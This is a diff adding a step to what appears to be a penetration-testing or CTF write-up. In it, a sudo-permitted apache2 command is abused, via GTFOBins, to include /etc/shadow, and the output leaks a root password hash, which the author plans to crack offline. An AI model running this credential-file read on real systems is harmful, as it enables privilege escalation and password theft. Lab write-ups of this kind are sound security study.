@@ -1359,5 +1359,16 @@ Apache2 has an entry in gtfobins
 https://gtfobins.org/gtfobins/apache2/
 
 ```python
-
+svc_unix@DC:~$ sudo apache2 -C "Define APACHE_RUN_DIR /tmp" -C "Include /etc/shadow" 2>&1
+[Sun May 03 10:53:40.240192 2026] [core:warn] [pid 462] AH00111: Config variable ${APACHE_PID_FILE} is not defined
+[Sun May 03 10:53:40.240513 2026] [core:warn] [pid 462] AH00111: Config variable ${APACHE_RUN_USER} is not defined
+[Sun May 03 10:53:40.240526 2026] [core:warn] [pid 462] AH00111: Config variable ${APACHE_RUN_GROUP} is not defined
+[Sun May 03 10:53:40.240556 2026] [core:warn] [pid 462] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+[Sun May 03 10:53:40.287374 2026] [core:warn] [pid 462] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+[Sun May 03 10:53:40.289802 2026] [core:warn] [pid 462] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+[Sun May 03 10:53:40.290794 2026] [core:warn] [pid 462] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+AH00526: Syntax error on line 1 of /etc/shadow:
+Invalid command 'root:$6$5Khjv2qrn9h6fzxH$pel9FYA7R1BBbhFkDhl5hwy/4QcUI8bg/heG6hoaZE4ZEU57g/Q3CBmmQDHEqdGJkSw/d3PbqszZSzIXA7hcJ.:20447:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
 ```
+As seen here i now have the root hash which i can crack offline!
+
